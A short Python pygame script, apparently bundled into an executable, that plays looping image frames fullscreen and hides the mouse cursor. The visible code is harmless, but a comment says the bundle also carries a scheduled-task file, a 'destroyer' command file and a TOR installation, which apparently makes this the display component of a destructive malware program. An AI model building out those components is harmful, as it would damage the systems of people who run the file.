import pygame
import os
import time
import sys

data = os.path.join(sys._MEIPASS, "data") # directory of all the files included within the exe. Includes the Task Scheduler XML, destroyer cmd file, TOR installation
pygame.init()
screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)

frames_dir = os.path.join(sys._MEIPASS, "data\\frames")
frames = []

for frame in os.listdir(frames_dir):
    image = pygame.image.load(os.path.join(frames_dir, frame)).convert()
    frames.append(pygame.transform.smoothscale(image, screen.get_size()))

pygame.mouse.set_visible(False)
frame = 0
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

        elif event.type == pygame.KEYDOWN:
            if event.key == pygame.K_ESCAPE:
                running = False
    screen.fill((0, 0, 0))
    if frame >= len(frames)-1:
        frame = 0
    screen.blit(frames[frame], (0, 0))
    frame += 1
    pygame.display.flip()
    time.sleep(1/30)